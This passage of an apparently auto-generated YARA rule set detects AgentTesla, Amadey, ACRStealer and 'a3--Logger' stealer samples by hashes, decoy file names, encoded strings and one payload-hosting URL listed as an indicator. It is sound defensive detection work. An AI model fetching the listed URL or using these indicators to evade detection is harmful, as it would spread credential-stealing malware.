      $s15 = "ExecuteGroupedRunner" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5816b4ad {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5816b4ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5816b4ad23e5be9263268d808cede57ea1dde54b7456b1715edfe8b49a39745b"
   strings:
      $s1 = "Smqmzlutn.exe" fullword wide /* score: '22.00'*/
      $s2 = "GSmqmzlutn, Version=1.0.4851.10549, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "Ulwrftp.Properties.Resources.resources" fullword ascii /* score: '12.00'*/
      $s4 = "Ulwrftp.Properties" fullword ascii /* score: '12.00'*/
      $s5 = "Ulwrftp.Properties.Resources" fullword wide /* score: '12.00'*/
      $s6 = "Ulwrftp" fullword ascii /* score: '11.00'*/
      $s7 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s8 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s10 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s11 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s12 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s13 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s14 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
      $s15 = "* _B(Bh" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__205b0fc9 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_205b0fc9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "205b0fc98b87b12ea0b816f3c9952780c9d99813be9a3460fd32d542540c43b5"
   strings:
      $s1 = "ExecuteIterableCommand" fullword ascii /* score: '26.00'*/
      $s2 = "ExecuteStatelessCommand" fullword ascii /* score: '26.00'*/
      $s3 = "Euugmovrdf.Execution" fullword ascii /* score: '23.00'*/
      $s4 = "CommandLogger" fullword ascii /* score: '22.00'*/
      $s5 = "Gbttjfv.exe" fullword wide /* score: '22.00'*/
      $s6 = "DGbttjfv, Version=1.0.2601.3101, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s7 = "m_CommandSharerObj" fullword ascii /* score: '15.00'*/
      $s8 = "_VirtualCommandItems" fullword ascii /* score: '12.00'*/
      $s9 = "commandConsumerArray" fullword ascii /* score: '12.00'*/
      $s10 = "CommandTracker" fullword ascii /* score: '12.00'*/
      $s11 = "AssetCommand" fullword ascii /* score: '12.00'*/
      $s12 = "ForceDetachedCommand" fullword ascii /* score: '12.00'*/
      $s13 = "RunScalableCommand" fullword ascii /* score: '11.00'*/
      $s14 = "Gbttjfv.Threading" fullword ascii /* score: '10.00'*/
      $s15 = "IdentifyFlexibleRunner" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8abf6c9e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8abf6c9e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8abf6c9e4b1172f9b631b8b2d808d2136bc343f46b7d479ed9e5b02156ba8b83"
   strings:
      $s1 = "Sigswiptv.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteSender" fullword ascii /* score: '18.00'*/
      $s3 = "TimeZoneConverter.Data.Aliases.csv.gz" fullword wide /* score: '14.00'*/
      $s4 = "TimeZoneConverter.Data.RailsMapping.csv.gz" fullword wide /* score: '14.00'*/
      $s5 = "TimeZoneConverter.Data.Mapping.csv.gz" fullword wide /* score: '14.00'*/
      $s6 = "MapperLogger" fullword ascii /* score: '14.00'*/
      $s7 = "InitializeScopeLogger" fullword ascii /* score: '14.00'*/
      $s8 = "SaveTransformableEncryptor" fullword ascii /* score: '14.00'*/
      $s9 = "SetEditableEncryptor" fullword ascii /* score: '14.00'*/
      $s10 = "m_OrderCommand" fullword ascii /* score: '12.00'*/
      $s11 = "6Sigswiptv.Values.SequentialValue+<GetEmbeddedData>d__1" fullword ascii /* score: '12.00'*/
      $s12 = "m_InitializerCommandDic" fullword ascii /* score: '12.00'*/
      $s13 = "ArrangeToken" fullword ascii /* score: '12.00'*/
      $s14 = "interpreterDecryptorObj" fullword ascii /* score: '11.00'*/
      $s15 = "AwakeTemplate" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a575a95b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a575a95b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a575a95b2db4571eaa81d2b9cc431d7f34929af741ef4a9d095f113dba8cb430"
   strings:
      $s1 = "Zgrzrkyexu.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Zgrzrkyexu.exe" fullword wide /* score: '22.00'*/
      $s3 = "ValidateRemoteExecutor" fullword ascii /* score: '19.00'*/
      $s4 = "ExecuteMapper" fullword ascii /* score: '18.00'*/
      $s5 = "m_ReadableEncryptorPerc" fullword ascii /* score: '17.00'*/
      $s6 = "ConfigurationLogger" fullword ascii /* score: '17.00'*/
      $s7 = "m_FunctionExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "m_IteratorExecutor" fullword ascii /* score: '16.00'*/
      $s9 = "HZgrzrkyexu, Version=1.0.9043.14913, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s10 = "PortableCommand" fullword ascii /* score: '15.00'*/
      $s11 = "DecodeCommand" fullword ascii /* score: '14.00'*/
      $s12 = "SolveDividedLogger" fullword ascii /* score: '14.00'*/
      $s13 = "SolveCommonDecryptor" fullword ascii /* score: '14.00'*/
      $s14 = "Fvwieelzg.Compression" fullword ascii /* score: '14.00'*/
      $s15 = "ConvertGeneralCommand" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6fa48959 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6fa48959.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6fa489597ac873e18887715a48134546cb7a316c0aac124700f905cd21c461bd"
   strings:
      $s1 = "Ijnozquyh.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "_EncryptorCommandInterval" fullword ascii /* score: '22.00'*/
      $s3 = "Ijnozquyh.exe" fullword wide /* score: '22.00'*/
      $s4 = "ExecuteReg" fullword ascii /* score: '18.00'*/
      $s5 = "7777777778" ascii /* score: '17.00'*/ /* hex encoded string 'wwwwx' */
      $s6 = "XVVVVVVVVVW" fullword ascii /* base64 encoded string ']UUUUUUU' */ /* score: '16.50'*/
      $s7 = "GIjnozquyh, Version=1.0.5217.26164, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s8 = "oVVVVVVVVVVVVVVo" fullword ascii /* base64 encoded string 'UUUUUUUUUUZ' */ /* score: '14.00'*/
      $s9 = "SerializeLogger" fullword ascii /* score: '14.00'*/
      $s10 = "AdjustFlexibleCommand" fullword ascii /* score: '12.00'*/
      $s11 = "template_start" fullword ascii /* score: '11.00'*/
      $s12 = "m_ViewerTemplateDist" fullword ascii /* score: '11.00'*/
      $s13 = "_ParameterTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "versionreg" fullword ascii /* score: '11.00'*/
      $s15 = "RemoveRandomDecryptor" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b14f1cf2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b14f1cf2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b14f1cf2267f8da0efbb9f5ae9a51a18e94e25e37db2f339a8bf7c9c04a2772b"
   strings:
      $s1 = "Hblpzpsx.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://primeline.it.com/pure/Jxtbllvjh.wav" fullword wide /* score: '17.00'*/
      $s3 = "FHblpzpsx, Version=1.0.3842.17891, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s5 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s6 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s7 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s8 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s10 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s11 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d41ab4de {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d41ab4de.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d41ab4de7e27d9558922af26c4e5febc0d8ca92c918d89d950112dbdc1bbf35f"
   strings:
      $s1 = "Zzosc.exe" fullword wide /* score: '22.00'*/
      $s2 = "CZzosc, Version=1.0.1354.16721, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "gTV4XyRi/B5uTS1qsThiRC8hkz94TixtvjUwbCR7lyJ/WThOoT9uRiNjq3dsTjVQlDlnRw9uvykwRDFQmyJuWjRuviV/UnpotzhUZyRhtThjEAZqphhyWyRJoCNmYyBh" wide /* score: '16.00'*/
      $s4 = "'rpNV,j+ _" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__026f6b81 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_026f6b81.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "026f6b81acb81bef3b445c2f1adcd6d6f747942ea61c28be6cc007cb3fa297ce"
   strings:
      $s1 = "Tgab.exe" fullword wide /* score: '22.00'*/
      $s2 = "Tgab.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = " heZQq:\"@" fullword ascii /* score: '10.00'*/
      $s6 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s7 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s8 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s9 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s10 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s11 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s12 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s13 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__302d72d3 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_302d72d3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "302d72d36d36919ed43d1bd9027eaf3e4b5765f2ce21c513e2b5c78dc392207f"
   strings:
      $s1 = "VJZh.exe" fullword wide /* score: '22.00'*/
      $s2 = "VJZh.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s6 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s7 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s8 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s12 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6d22873af2e97b169882a723b167759e1c7f7b4952c3c015c58cf83a80e5b19b"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s3 = "VO64nLndMfyU.TYtjzacM.res" fullword ascii /* score: '10.00'*/
      $s4 = "DLgU:\\" fullword ascii /* score: '10.00'*/
      $s5 = "PCDLleH8" fullword ascii /* score: '10.00'*/
      $s6 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s7 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s8 = "Wupn:\\R" fullword ascii /* score: '10.00'*/
      $s9 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s10 = "* IOvs" fullword ascii /* score: '9.00'*/
      $s11 = "mWx* -" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074cec00 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074cec00.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074cec0065bd7fa9ad545a44a73ab75074b9a5a59f7ee357cb50a918fe41be2e"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s3 = "VTD5geWN0" fullword ascii /* base64 encoded string 'L>`yct' */ /* score: '11.00'*/
      $s4 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s5 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s6 = "OgjhnI7SC9gB.dvloidJc.res" fullword ascii /* score: '10.00'*/
      $s7 = "OgjhnI7SC9gB.QZLSb0Ly.ksd" fullword ascii /* score: '10.00'*/
      $s8 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s9 = "6^Z* -" fullword ascii /* score: '9.00'*/
      $s10 = "4kiRcTko" fullword ascii /* score: '9.00'*/
      $s11 = "6%d%e\\" fullword ascii /* score: '8.00'*/
      $s12 = "PAwrC* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__57cdbe28 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_57cdbe28.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57cdbe285355d2cad1dd56c51e624cbaa41e11f9fe4ceabce51321a94d6365d1"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s3 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s4 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s5 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s6 = "q* -ku" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__724598c5 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_724598c5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "724598c58e9e3792843ee3fad45d0cbabf3a04d71041e0257311c80dfd587a12"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s3 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s4 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s5 = "cp4rUUj99SyG.OALk3EqP.res" fullword ascii /* score: '10.00'*/
      $s6 = "cp4rUUj99SyG.sYTcYLWg.ksd" fullword ascii /* score: '10.00'*/
      $s7 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s8 = "\\3B']]om:\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e9c511a9 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e9c511a9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9c511a96c3a382a30e6f535807df26e90a672fc89167a826c2dae94f93d7da8"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s3 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s4 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s5 = "vWnmHtsje8OV.AvrJWRBb.res" fullword ascii /* score: '10.00'*/
      $s6 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67e03eb7 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67e03eb7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67e03eb72e16a3c18d1b9479134dc821b280044c274d32b0dd1b431c67cd8b5f"
   strings:
      $s1 = "krAr.exe" fullword wide /* score: '22.00'*/
      $s2 = "krAr.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s4 = "QHYG:\"" fullword ascii /* score: '10.00'*/
      $s5 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s6 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s7 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s8 = "contentTextBox" fullword ascii /* score: '9.00'*/
      $s9 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8083f782 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8083f782.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8083f78285c06dda9f7eb22ab84954ab219306e488de21e36c73797725c4844d"
   strings:
      $s1 = "Oqzrmjh.exe" fullword wide /* score: '22.00'*/
      $s2 = "TimeZoneConverter.Data.Aliases.csv.gz" fullword ascii /* score: '14.00'*/
      $s3 = "TimeZoneConverter.Data.RailsMapping.csv.gz" fullword ascii /* score: '14.00'*/
      $s4 = "TimeZoneConverter.Data.Mapping.csv.gz" fullword ascii /* score: '14.00'*/
      $s5 = "Vz9LNEoA4" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s6 = "9NM6sd2uifgso9SmxN4gqtbt5tk6oNWhy9Nygt234sQ9t8GC1NksqNqv3pEuoMyc4d8lqfaiys9yqsic7sQstM2iy8M9vIOkwt4Wid2twN4h/v+m0/4wtd2F1cUkjdmt" wide /* score: '11.00'*/
      $s7 = "UhjW^- " fullword ascii /* score: '8.00'*/
      $s8 = "Yefe* A" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3c85445e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3c85445e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c85445e7fad753612bb0f4e6494b8cca471adb609941b53f80a9f58f123bb44"
   strings:
      $s1 = "Yrdiyafee.exe" fullword wide /* score: '22.00'*/
      $s2 = "TimeZoneConverter.Data.Aliases.csv.gz" fullword ascii /* score: '14.00'*/
      $s3 = "TimeZoneConverter.Data.RailsMapping.csv.gz" fullword ascii /* score: '14.00'*/
      $s4 = "TimeZoneConverter.Data.Mapping.csv.gz" fullword ascii /* score: '14.00'*/
      $s5 = "9TU5tP157" fullword ascii /* base64 encoded string 'MNm?^{' */ /* score: '11.00'*/
      $s6 = "Obo7qBTfRJEtuh3XCbchsx+cK7A7uRzQBrpzmxTGL608rgjzGbAtsRPeE/gvuQXtLLYksD/TB6ZzswHtI60trQTTBqo8pUrVD7cXkBTcDbcg5zbXHpcxrBT0GKwllBDc" wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1ebe1f47 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1ebe1f47.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1ebe1f47aa49e50e571f195abc1ccfc2110fdb0ac28ba049b8fc0ea38dd97e08"
   strings:
      $s1 = "Nywvgzk.exe" fullword wide /* score: '22.00'*/
      $s2 = "get_Yejstfgqbr" fullword ascii /* score: '9.00'*/
      $s3 = "<InvokeType>b__0" fullword ascii /* score: '8.00'*/
      $s4 = "InvokeType" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd89ca64 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd89ca64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd89ca640822adfa50e26a25cbdb2b8da90d7e2150b26d6ee49794eb7163c509"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Cohnxv.exe" fullword wide /* score: '22.00'*/
      $s3 = "CCohnxv, Version=1.0.5608.7482, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "8KkA4DRxjYIW8j15wKQa+z8y4qMA8Tx+z6lI0zRo5r4H5ihd0KMW+TNw2usU8SVD5aUf+B99zrVI+yFD6r4W5SR9z7kH7Wp7xqQs2DRyxKQbrxZ514QK5DRa0b8e3DBy" wide /* score: '11.00'*/
      $s5 = "GZYu.Kue" fullword ascii /* score: '10.00'*/
      $s6 = "a* -a[8 D\\{#Ye " fullword ascii /* score: '9.00'*/
      $s7 = "afefefefeffe" ascii /* score: '8.00'*/
      $s8 = "ffefefeeffe" ascii /* score: '8.00'*/
      $s9 = "ffeefeffeef" ascii /* score: '8.00'*/
      $s10 = "fefeffefeef" ascii /* score: '8.00'*/
      $s11 = "fefefeffe" ascii /* score: '8.00'*/
      $s12 = "feffefefeef" ascii /* score: '8.00'*/
      $s13 = "feffefefea" ascii /* score: '8.00'*/
      $s14 = "fefefeffea" ascii /* score: '8.00'*/
      $s15 = "afefefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2eed5c2f743f07399f70db53d2beeb1594b5842240e08d04adad40be58200bc"
   strings:
      $s1 = "acr-GETWELL-ip2s4amu.cx5_.exe" fullword wide /* score: '24.00'*/
      $s2 = "Wacr-GETWELL-ip2s4amu.cx5_, Version=1.0.2106.15318, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s3 = ".NET Framework 4.6," fullword ascii /* score: '10.00'*/
      $s4 = "* j)m&" fullword ascii /* score: '9.00'*/
      $s5 = "acr-GETWELL-ip2s4amu.cx5_" fullword wide /* score: '9.00'*/
      $s6 = "Xe* -$" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8e0352e6 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8e0352e6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e0352e656552427567aebbe88b84053556dea8aba1ccc595580ee19c40d8582"
   strings:
      $s1 = "Order PO021008025RFQ_4135-00712 Quotation.exe" fullword wide /* score: '19.00'*/
      $s2 = "ProcessExtendedServer" fullword ascii /* score: '15.00'*/
      $s3 = "ProcessCentralServer" fullword ascii /* score: '15.00'*/
      $s4 = "WaitForOperationalServer" fullword ascii /* score: '9.00'*/
      $s5 = "get_Fqjsxoqphqo" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7e768b61 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7e768b61.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7e768b61b08717ac88f08641912358a8adcac17b06304044b552d9742eda6361"
   strings:
      $s1 = "Voenptt.exe" fullword wide /* score: '22.00'*/
      $s2 = "OperationalEncryptor" fullword ascii /* score: '19.00'*/
      $s3 = "_GeneratorExecutor" fullword ascii /* score: '16.00'*/
      $s4 = "EVoenptt, Version=1.0.6480.11644, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "EvaluateDetailedProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessPortableArgument" fullword ascii /* score: '15.00'*/
      $s7 = "ProcessScopeArgument" fullword ascii /* score: '15.00'*/
      $s8 = "ProcessCustomizableArgument" fullword ascii /* score: '15.00'*/
      $s9 = "_AlphabeticEncryptorItems" fullword ascii /* score: '14.00'*/
      $s10 = "SCQ.tMP" fullword ascii /* score: '14.00'*/
      $s11 = "FlushEncryptor" fullword ascii /* score: '14.00'*/
      $s12 = "InspectAccessibleEncryptor" fullword ascii /* score: '14.00'*/
      $s13 = "m_EncryptorRequesterScore" fullword ascii /* score: '14.00'*/
      $s14 = "_GeneralEncryptor" fullword ascii /* score: '14.00'*/
      $s15 = "ChangeEncryptor" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a9369f71 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a9369f71.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a9369f71a2fd4ac66b3339e665680162801ff29665cbe0ab6e78f79742a410ae"
   strings:
      $s1 = "Dry-Dock Specifications.exe" fullword wide /* score: '15.00'*/
